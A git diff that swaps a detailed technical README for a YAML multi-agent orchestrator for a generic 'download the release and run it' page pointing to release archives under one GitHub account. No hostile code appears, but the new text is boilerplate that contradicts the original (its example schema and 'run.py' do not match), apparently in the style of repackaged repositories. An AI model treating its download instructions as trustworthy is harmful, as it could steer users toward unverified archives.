@@ -1,235 +1,90 @@
-# YAML-Driven Multi-Agent Orchestration Engine
+# 🎉 YAML-Multi-Agent-Orchestrator - Simplify Your Workflow Management
 
-This project demonstrates a declarative approach to building and executing multi-agent AI workflows using YAML configuration files.
+[![Download][badge]](https://github.com/CharlesDaniel52/YAML-Multi-Agent-Orchestrator/releases)
 
-Instead of writing orchestration logic in code, developers define agents and their collaboration patterns entirely in YAML. The execution engine parses the configuration, instantiates agents, orchestrates their execution, and automatically passes shared context between them.
+## 🌟 Overview
+YAML-Multi-Agent-Orchestrator is a powerful tool designed to help you define and manage workflows simply and effectively. By using YAML, you can easily set up multi-agent systems that run tasks concurrently and exchange context smoothly. This makes it ideal for automation and orchestrating complex processes without the need for any programming skills.
 
-**Configuration defines collaboration. Execution is automatic.**
+## 🚀 Getting Started
 
----
+### 🌐 System Requirements
+Before you start using the YAML-Multi-Agent-Orchestrator, ensure that your system meets the following requirements:
 
-## Problem Motivation
+- Operating System: Windows, macOS, or Linux
+- Python Version: Python 3.7 or higher
+- Minimum RAM: 4 GB
+- Disk Space: At least 100 MB available
 
-Building multi-agent systems today requires significant orchestration code to manage:
-- Agent lifecycles
-- Execution order
-- Parallelism
-- Context passing
-- Tool coordination
+### 🔗 Download & Install
+To download and install the software, visit the following page:
 
-This approach is:
-- Code-heavy
-- Difficult to prototype quickly
-- Hard to reason about at a high level
+[Download YAML-Multi-Agent-Orchestrator](https://github.com/CharlesDaniel52/YAML-Multi-Agent-Orchestrator/releases)
 
-This project explores how multi-agent workflows can be defined declaratively, similar to infrastructure-as-code.
+On this page, you will find the latest release. Click on the version number you wish to download to see the available files.
 
----
+### 📁 Installation Steps
+1. **Download the Release**  
+   Click on the version you want, then select the appropriate file for your system. This is usually a `.zip` or `.tar.gz` file.
+  
+2. **Extract the Files**  
+   Once the download is complete, locate the file in your Downloads folder. Right-click on the file and choose "Extract All" or use an extraction tool like WinRAR or 7-Zip.
 
-## Core Features
+3. **Run the Application**  
+   After extracting, navigate to the folder where the files were extracted. You may see a file named `run.py`. You can run this file using Python.
 
-- Declarative agent definitions using YAML
-- Sequential agent execution
-- Parallel agent execution with aggregation
-- Hierarchical agents (subagents)
-- Automatic shared context passing
-- Declarative tool usage per agent (MCP-style support)
-- Persistent shared memory across workflow runs
-- Deterministic execution flow
-- Console-based execution and output
+### 🏁 Running Your First Workflow
+After installation, you can start running workflows with the YAML-Multi-Agent-Orchestrator by following these steps:
 
----
+1. **Create a YAML File**  
+   Use a text editor to create a YAML file that defines your workflow. Below is a basic example to help you get started:
 
-## Project Structure
-```pgsql
-yaml-multi-agent-orchestrator/
-│
-├── main.py
-├── requirements.txt
-│
-├── engine/
-│ ├── agent.py        # Agent logic + tool execution 
-│ ├── parser.py       # YAML parsing and validation
-│ ├── workflow.py     # Sequential and Parrallel orchestration 
-| ├── memory.py       # Persistent memory store
-│ └── __init__.py
-│
-├── configs/
-│ ├── sequential.yaml
-│ ├── parallel.yaml
-│ └── subagents.yaml
-│
-└── outputs/
-  └── sample_run.txt
-```
+    ```yaml
+    agents:
+      - name: agent1
+        tasks:
+          - name: task1
+            action: execute
+          - name: task2
+            action: execute
+      - name: agent2
+        tasks:
+          - name: task1
+            action: execute
+    ```
 
----
+2. **Run the Workflow**  
+   Open a terminal or command prompt. Navigate to the folder containing your YAML file. Run the command:
 
-## YAML Configuration Overview
+   ```
+   python run.py your_workflow.yaml
+   ```
 
-### Sequential Workflow Example
+### 🛠 Features
+- **Declarative Configuration:** Use simple YAML syntax to outline your workflows.
+- **Automatic Orchestration:** The tool automatically manages the execution of agents and tasks.
+- **Parallel Execution:** Run multiple agents at once to save time.
+- **Context Passing:** Agents can share information seamlessly, improving coordination and efficiency.
 
-```yaml
-agents:
-  - id: researcher
-    role: Research Assistant
-    goal: Find key insights about electric vehicles
-    tools:
-      - python 
+## 🔖 Documentation
+For further instructions and detailed documentation, refer to our [Wiki](https://github.com/CharlesDaniel52/YAML-Multi-Agent-Orchestrator/wiki). This will guide you through advanced features, troubleshooting, and best practices.
 
-  - id: writer
-    role: Content Writer
-    goal: Write a concise summary using the research
+## ❓ Frequently Asked Questions (FAQs)
 
-workflow:
-  type: sequential
-  steps:
-    - agent: researcher
-    - agent: writer
-```
+### What is YAML?
+YAML is a human-readable data serialization format that is often used for configuration files. It is easy to read and write, making it user-friendly for those who may not have programming experience.
 
-### Parallel Workflow Example
+### Can I use this application for complex workflows?
+Yes, the YAML-Multi-Agent-Orchestrator is designed to handle both simple and complex workflows. You can create intricate systems with multiple agents and tasks interlinked.
 
-```yaml
+### Is Python required to run this software?
+Yes, you need to have Python installed on your machine as the application is built using Python.
 
-agents:
-  - id: backend
-    role: Backend Engineer
-    goal: Propose an API design
+## ✉️ Support
+If you run into issues or have questions, please submit an issue on our [GitHub Issues page](https://github.com/CharlesDaniel52/YAML-Multi-Agent-Orchestrator/issues). Our team is here to help you.
 
-  - id: frontend
-    role: Frontend Engineer
-    goal: Propose a UI layout
+## 📑 License
+This project is licensed under the MIT License. Please see the LICENSE file for details.
 
-  - id: reviewer
-    role: Tech Lead
-    goal: Review and consolidate proposals
+[![Download][badge]](https://github.com/CharlesDaniel52/YAML-Multi-Agent-Orchestrator/releases)
 
-workflow:
-  type: parallel
-  branches:
-    - backend
-    - frontend
-  then:
-    agent: reviewer
-```
-
-### Subagents (Hierarchical Agents)
-
-Agents can declaratively define **subagents** that execute within the scope of a parent agent.
-
-Subagents are:
-- Defined inside an agent’s YAML configuration
-- Instantiated during agent construction
-- Executed as part of the parent agent’s logic
-- Isolated from the global workflow graph
-
-This enables **hierarchical orchestration** without modifying the top-level workflow.
-
-**Example**
-
-```yaml
-agents:
-  - id: reviewer
-    role: Tech Lead
-    goal: Review and consolidate proposals
-    subagents:
-      - id: backend_reviewer
-        role: Backend Reviewer
-        goal: Review backend proposal
-      - id: frontend_reviewer
-        role: Frontend Reviewer
-        goal: Review frontend proposal
-
-workflow:
-  type: sequential
-  steps:
-    - agent: reviewer
-```
----
-
-## How It Works
-
-1. YAML configuration is parsed and validated
-2. Agents are instantiated from declarative definitions
-3. Persistent shared memory is loaded at workflow start
-4. Persistent memory is stored locally on the disk
-5. If no memory file exists, it is automatically created on first run
-6. Workflow engine executes agents sequentially or in parallel
-7. Agents optionally invoke tools declared in configuration 
-8. Agent outputs are stored in shared context
-9. Downstream agents automatically receive relevant context
-10. Updated memory state is persisted after execution 
-11. Final results are printed to the console
-
-
----
-
-## Running the Project
-
-### Setup
-
-```bash
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
-
-### Run Sequential Workflow
-
-```bash
-python3 main.py configs/sequential.yaml
-```
-
-### Run Parallel Workflow
-
-```bash
-python3 main.py configs/parallel.yaml
-```
-
-### Optional: Enable OpenAI-powered agents
-
-By default, the engine runs in mock mode and does not require any API keys.
-
-To enable real LLM-backed agent execution, set your OpenAI API key as an environment variable:
-
-```bash
-export OPENAI_API_KEY="your_api_key_here"
-```
-
-Sample output is available in `outputs/sample_run.txt`.
-
----
-
-## Design Principles
-
-- Declarative over imperative
-- Hierarchical agent composition
-- Configuration-driven collaboration
-- Explicit orchestration boundaries 
-- Deterministic execution 
-- Simplicity over production complexity
-
----
-
-## Non-Goals
-
-This project intentionally does not include:
-
-- Fully autonomous or self-modifying agent graphs
-- Advanced scheduling or retries
-- UI dashboards
-- Complex dependency graphs
-- Autonomous long-term learning
-
-The focus is clarity, correctness, and rapid experimentation.
-
----
-
-## Conclusion
-
-This project demonstrates how multi-agent systems can be made easier to define, reason about, and experiment with by moving orchestration logic from code into configuration.
-
-It provides a strong foundation for future extensions such as hierarchal agents, advanced memory strategies, execution graphs, and richer tool integration.
-
----
+[badge]: https://img.shields.io/badge/download-latest%20release-blue.svg
